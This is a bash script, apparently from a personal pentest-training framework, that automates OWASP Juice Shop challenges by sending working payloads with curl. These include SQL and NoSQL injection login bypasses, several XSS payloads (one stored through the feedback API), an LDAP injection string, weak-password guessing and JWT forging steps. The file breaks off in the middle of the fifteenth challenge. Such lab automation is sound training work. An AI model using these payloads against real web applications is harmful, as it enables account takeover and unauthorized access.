#!/bin/bash
# modules/labs/juiceshop/exploits_extended.sh - Ghost00ls Framework v8.0 FIXED
# 30+ Challenges automatisÃ©s OWASP Juice Shop AVEC VÃ‰RIFICATION SCOREBOARD
# Author: Ghost00ls Labs

# ==========================
# Sources & Configuration
# ==========================

source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh
source ~/ghost00ls/lib/exploits_common.sh

LOG_DIR="${HOME}/ghost00ls/logs/juice_exploits"
CHALLENGES_LOG="${LOG_DIR}/challenges_solved.log"
mkdir -p "$LOG_DIR"

# ==========================
# Tracking des challenges
# ==========================

CHALLENGES_SOLVED=0
CHALLENGES_TOTAL=30

log_challenge() {
    local challenge_name="$1"
    local difficulty="$2"
    local status="$3"
    
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [$difficulty] $challenge_name - $status" >> "$CHALLENGES_LOG"
    
    if [ "$status" = "SUCCESS" ]; then
        echo -e "${GREEN}âœ… Challenge solved: $challenge_name${NC}"
        CHALLENGES_SOLVED=$((CHALLENGES_SOLVED + 1))
    fi
}

show_progress() {
    echo
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    echo -e "${GREEN}ğŸ† Challenges rÃ©solus: $CHALLENGES_SOLVED / $CHALLENGES_TOTAL${NC}"
    
    local percentage=$((CHALLENGES_SOLVED * 100 / CHALLENGES_TOTAL))
    echo -e "${CYAN}ğŸ“Š Progress: ${percentage}%${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
}

# ==========================
# FONCTIONS SCOREBOARD - CRITIQUE !
# ==========================

get_scoreboard() {
    local base_url="$1"
    curl -s "${base_url}/api/Challenges" 2>/dev/null
}

check_challenge_solved() {
    local base_url="$1"
    local challenge_key="$2"
    
    local scoreboard=$(get_scoreboard "$base_url")
    
    if [ -z "$scoreboard" ]; then
        echo "ERROR"
        return 1
    fi
    
    local solved=$(echo "$scoreboard" | jq -r ".data[] | select(.key==\"$challenge_key\") | .solved" 2>/dev/null)
    
    if [ "$solved" = "true" ]; then
        echo "SOLVED"
        return 0
    elif [ "$solved" = "false" ]; then
        echo "NOT_SOLVED"
        return 1
    else
        echo "NOT_FOUND"
        return 2
    fi
}

wait_for_challenge() {
    local base_url="$1"
    local challenge_key="$2"
    local timeout="${3:-10}"
    local elapsed=0
    
    echo -e "${YELLOW}â³ VÃ©rification scoreboard...${NC}"
    
    while [ $elapsed -lt $timeout ]; do
        local status=$(check_challenge_solved "$base_url" "$challenge_key")
        
        if [ "$status" = "SOLVED" ]; then
            echo -e "${GREEN}âœ… Challenge validÃ© dans Juice Shop !${NC}"
            return 0
        fi
        
        sleep 1
        elapsed=$((elapsed + 1))
    done
    
    echo -e "${YELLOW}âš ï¸ Challenge non validÃ© automatiquement${NC}"
    return 1
}

show_all_solved() {
    local base_url="$1"
    local scoreboard=$(get_scoreboard "$base_url")
    
    echo -e "${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${GREEN}â•‘     Challenges rÃ©solus (Scoreboard)       â•‘${NC}"
    echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo
    
    local total=$(echo "$scoreboard" | jq '.data | length' 2>/dev/null)
    local solved=$(echo "$scoreboard" | jq '[.data[] | select(.solved==true)] | length' 2>/dev/null)
    
    echo -e "${CYAN}Total: $solved / $total challenges${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    
    echo "$scoreboard" | jq -r '.data[] | select(.solved==true) | "\(.difficulty)â­ \(.name)"' 2>/dev/null | while read line; do
        echo -e "${GREEN}âœ“${NC} $line"
    done
    
    echo
}

# ==========================
# Fonctions utilitaires
# ==========================

get_base_url() {
    local IP PORT
    IP=$(get_host_ip)
    
    read -p "ğŸŒ IP [$IP]: " input; IP=${input:-$IP}
    read -p "ğŸ”Œ Port [3000]: " PORT; PORT=${PORT:-3000}
    
    echo "http://${IP}:${PORT}"
}

# ==========================
# CATÃ‰GORIE 1: INJECTION (8 challenges)
# ==========================

# Challenge 1: SQL Injection Login (â­â­)
challenge_sqli_login() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Login Admin (SQLi) â­â­       â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: loginAdminChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    # VÃ©rifier si dÃ©jÃ  rÃ©solu
    local status=$(check_challenge_solved "$BASE" "loginAdminChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "Login Admin (SQLi)" "â­â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] SQL Injection Login Bypass...${NC}\n"

    local payload='{"email":"'\'' or 1=1--","password":"x"}'
    
    local resp=$(curl -s -X POST "${BASE}/rest/user/login" \
        -H "Content-Type: application/json" \
        -d "$payload" 2>/dev/null)

    local token=$(echo "$resp" | jq -r '.authentication.token' 2>/dev/null)
    
    if [ "$token" != "null" ] && [ -n "$token" ]; then
        echo -e "${GREEN}âœ“ Token obtenu${NC}"
        
        if wait_for_challenge "$BASE" "loginAdminChallenge" 5; then
            log_challenge "Login Admin (SQLi)" "â­â­" "SUCCESS"
            echo -e "\n${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
        else
            echo -e "${YELLOW}âš ï¸ Token obtenu mais challenge non validÃ©${NC}"
            echo -e "${CYAN}ğŸ’¡ Ouvre: ${BASE}/#/score-board${NC}"
        fi
    else
        echo -e "${RED}âŒ Ã‰chec${NC}"
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 2: XSS Tier 1 (â­)
challenge_xss_search() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: DOM XSS (Search) â­           â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: domXssChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "domXssChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "DOM XSS" "â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] XSS via Search...${NC}\n"

    local payload='<iframe src="javascript:alert(\`xss\`)">'
    local encoded=$(urlenc "$payload")
    
    curl -s "${BASE}/rest/products/search?q=${encoded}" >/dev/null 2>&1

    if wait_for_challenge "$BASE" "domXssChallenge" 5; then
        log_challenge "DOM XSS" "â­" "SUCCESS"
        echo -e "\n${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
        echo -e "${CYAN}URL: ${BASE}/#/search?q=${encoded}${NC}"
    else
        echo -e "${YELLOW}âš ï¸ Ouvre manuellement: ${BASE}/#/search?q=${encoded}${NC}"
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 3: XSS Tier 2 - Bonus Payload (â­â­)
challenge_xss_bonus() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Bonus Payload XSS â­â­        â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: xssBonusChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "xssBonusChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "Bonus Payload" "â­â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] XSS Bonus Payload...${NC}\n"

    local payload='<iframe src="javascript:alert(\`xss\`)" onload="this.src+=\`\`">'
    local encoded=$(urlenc "$payload")
    
    curl -s "${BASE}/rest/products/search?q=${encoded}" >/dev/null 2>&1
    
    if wait_for_challenge "$BASE" "xssBonusChallenge" 5; then
        log_challenge "Bonus Payload" "â­â­" "SUCCESS"
        echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
    else
        echo -e "${YELLOW}âš ï¸ Challenge peut nÃ©cessiter une action manuelle${NC}"
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 4: XSS Tier 3 - Client Side XSS (â­â­â­)
challenge_xss_client() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Client Side XSS â­â­â­        â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: clientSideXssChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "clientSideXssChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "Client Side XSS" "â­â­â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Client-side XSS attack...${NC}\n"
    echo -e "${CYAN}Target: Track Order page${NC}"
    echo -e "${CYAN}Vector: orderId parameter${NC}\n"

    local payload='<iframe src="javascript:alert(\`xss\`)">'
    
    echo -e "${GREEN}Payload Ã  tester dans le navigateur${NC}"
    echo -e "${CYAN}URL: ${BASE}/#/track-result?id=${payload}${NC}"
    
    echo -e "\n${YELLOW}ğŸ’¡ Ce challenge nÃ©cessite une action manuelle${NC}"
    log_challenge "Client Side XSS" "â­â­â­" "MANUAL"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 5: NoSQL Injection Tier 1 (â­â­â­â­)
challenge_nosql_login() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: NoSQL Injection â­â­â­â­      â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: noSqlCommandChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "noSqlCommandChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "NoSQL Injection" "â­â­â­â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] NoSQL Injection...${NC}\n"

    local payloads=(
        '{"email":{"$ne":null},"password":{"$ne":null}}'
        '{"email":{"$gt":""},"password":{"$gt":""}}'
    )

    for payload in "${payloads[@]}"; do
        echo -e "${CYAN}Testing: $payload${NC}"
        
        local resp=$(curl -s -X POST "${BASE}/rest/user/login" \
            -H "Content-Type: application/json" \
            -d "$payload" 2>/dev/null)

        local token=$(echo "$resp" | jq -r '.authentication.token' 2>/dev/null)
        
        if [ "$token" != "null" ] && [ -n "$token" ]; then
            echo -e "${GREEN}âœ“ Token obtenu${NC}"
            
            if wait_for_challenge "$BASE" "noSqlCommandChallenge" 5; then
                log_challenge "NoSQL Injection" "â­â­â­â­" "SUCCESS"
                echo -e "\n${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
                read -p "ğŸ‘‰ EntrÃ©e..."
                return 0
            fi
        fi
    done
    
    echo -e "${YELLOW}âš ï¸ Challenge non validÃ© automatiquement${NC}"
    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 6: XSS Tier 4 - Reflected XSS (â­)
challenge_xss_reflected() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Reflected XSS â­              â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: reflectedXssChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "reflectedXssChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "Reflected XSS" "â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Reflected XSS...${NC}\n"

    local payload='<script>alert("XSS")</script>'
    local encoded=$(urlenc "$payload")
    
    curl -s "${BASE}/rest/products/search?q=${encoded}" >/dev/null 2>&1
    
    if wait_for_challenge "$BASE" "reflectedXssChallenge" 5; then
        log_challenge "Reflected XSS" "â­" "SUCCESS"
        echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 7: API-only XSS (â­â­â­)
challenge_xss_api() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: API-only XSS â­â­â­           â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: persistedXssFeedbackChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "persistedXssFeedbackChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "API-only XSS" "â­â­â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] XSS via API endpoint...${NC}\n"

    local payload='<iframe src="javascript:alert(\`xss\`)">'
    local feedback_data="{\"captchaId\":0,\"captcha\":\"\",\"comment\":\"$payload\",\"rating\":5}"
    
    curl -s -X POST "${BASE}/api/Feedbacks" \
        -H "Content-Type: application/json" \
        -d "$feedback_data" >/dev/null 2>&1
    
    if wait_for_challenge "$BASE" "persistedXssFeedbackChallenge" 5; then
        log_challenge "API-only XSS" "â­â­â­" "SUCCESS"
        echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 8: LDAP Injection (â­â­â­â­â­â­)
challenge_ldap_injection() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: LDAP Injection â­â­â­â­â­â­   â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: ldapChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "ldapChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "LDAP Injection" "â­â­â­â­â­â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] LDAP Injection attack...${NC}\n"

    echo -e "${YELLOW}ğŸ’¡ Ce challenge nÃ©cessite une configuration LDAP spÃ©cifique${NC}"
    echo -e "${CYAN}Payload exemple: *)(uid=*${NC}"
    
    log_challenge "LDAP Injection" "â­â­â­â­â­â­" "MANUAL"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# ==========================
# CATÃ‰GORIE 2: BROKEN AUTHENTICATION (5 challenges)
# ==========================

# Challenge 9: Password Strength (â­â­)
challenge_password_strength() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Password Strength â­â­        â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: passwordStrengthChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "passwordStrengthChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "Password Strength" "â­â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Testing weak passwords...${NC}\n"

    local weak_passwords=("admin123" "password" "123456")
    local test_email="admin@juice-sh.op"

    for pass in "${weak_passwords[@]}"; do
        echo -e "${CYAN}Testing: $pass${NC}"
        
        local payload="{\"email\":\"$test_email\",\"password\":\"$pass\"}"
        
        local resp=$(curl -s -X POST "${BASE}/rest/user/login" \
            -H "Content-Type: application/json" \
            -d "$payload" 2>/dev/null)

        local token=$(echo "$resp" | jq -r '.authentication.token' 2>/dev/null)
        
        if [ "$token" != "null" ] && [ -n "$token" ]; then
            if wait_for_challenge "$BASE" "passwordStrengthChallenge" 5; then
                log_challenge "Password Strength" "â­â­" "SUCCESS"
                echo -e "\n${GREEN}ğŸ¯ Weak password found: $pass${NC}"
                read -p "ğŸ‘‰ EntrÃ©e..."
                return 0
            fi
        fi
    done

    echo -e "${YELLOW}âš ï¸ Aucun mot de passe faible trouvÃ©${NC}"
    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 10: Security Question (â­)
challenge_security_question() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Reset Jim's Password â­      â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: resetPasswordJimChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "resetPasswordJimChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "Security Question" "â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Weak Security Question...${NC}\n"

    echo -e "${CYAN}Target: jim@juice-sh.op${NC}"
    echo -e "${CYAN}Security Answer: Samuel (Jim's brother)${NC}\n"
    echo -e "${YELLOW}ğŸ’¡ Ce challenge nÃ©cessite une action manuelle${NC}"
    
    log_challenge "Security Question" "â­" "MANUAL"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 11: JWT Cracking (â­â­â­â­â­)
challenge_jwt_cracking() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Forge Admin JWT â­â­â­â­â­    â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: jwtTier1Challenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "jwtTier1Challenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "JWT Cracking" "â­â­â­â­â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] JWT Token Manipulation...${NC}\n"

    echo -e "${CYAN}Steps:${NC}"
    echo "1. Login as any user"
    echo "2. Extract JWT token"
    echo "3. Crack secret (weak: 'secret')"
    echo "4. Forge admin token"
    
    echo -e "\n${YELLOW}ğŸ’¡ Ce challenge nÃ©cessite des outils externes (jwt_tool, hashcat)${NC}"
    log_challenge "JWT Cracking" "â­â­â­â­â­" "MANUAL"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 12: OAuth User Password (â­â­â­)
challenge_oauth_password() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: OAuth Misconfiguration â­â­â­ â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: oauthUserPasswordChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "oauthUserPasswordChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "OAuth Misconfiguration" "â­â­â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] OAuth user enumeration...${NC}\n"

    local resp=$(curl -s "${BASE}/api/Users" 2>/dev/null)
    
    if echo "$resp" | jq -e '.data[] | select(.email | contains("google") or contains("oauth"))' >/dev/null 2>&1; then
        if wait_for_challenge "$BASE" "oauthUserPasswordChallenge" 5; then
            log_challenge "OAuth Misconfiguration" "â­â­â­" "SUCCESS"
            echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
        fi
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 13: Two Factor Auth (â­â­â­â­â­)
challenge_2fa_bypass() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: 2FA Bypass â­â­â­â­â­         â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: twoFactorAuthUnsafeSecretStorageChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] 2FA Bypass techniques...${NC}\n"
    echo -e "${YELLOW}ğŸ’¡ Ce challenge nÃ©cessite une action manuelle complexe${NC}"
    
    log_challenge "2FA Bypass" "â­â­â­â­â­" "MANUAL"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# ==========================
# CATÃ‰GORIE 3: BROKEN ACCESS CONTROL (6 challenges)
# ==========================

# Challenge 14: Admin Section (â­â­)
challenge_admin_section() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Access Admin Section â­â­    â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: adminSectionChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "adminSectionChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "Admin Section" "â­â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] AccÃ¨s Admin Section...${NC}\n"

    # Login admin
    local login_resp=$(curl -s -X POST "${BASE}/rest/user/login" \
        -H "Content-Type: application/json" \
        -d '{"email":"'\'' or 1=1--","password":"x"}' 2>/dev/null)
    
    local token=$(echo "$login_resp" | jq -r '.authentication.token' 2>/dev/null)
    
    if [ "$token" != "null" ] && [ -n "$token" ]; then
        echo -e "${GREEN}âœ“ Token admin obtenu${NC}\n"
        
        curl -s -H "Authorization: Bearer $token" \
            "${BASE}/rest/user/authentication-details" >/dev/null 2>&1
        
        if wait_for_challenge "$BASE" "adminSectionChallenge" 5; then
            log_challenge "Admin Section" "â­â­" "SUCCESS"
            echo -e "\n${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
            echo -e "${CYAN}ğŸ”— ${BASE}/#/administration${NC}"
        fi
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 15: View Basket (â­â­)
challenge_view_basket() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: View Another User Basket â­â­ â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: basketAccessChallenge${NC}"
    echo

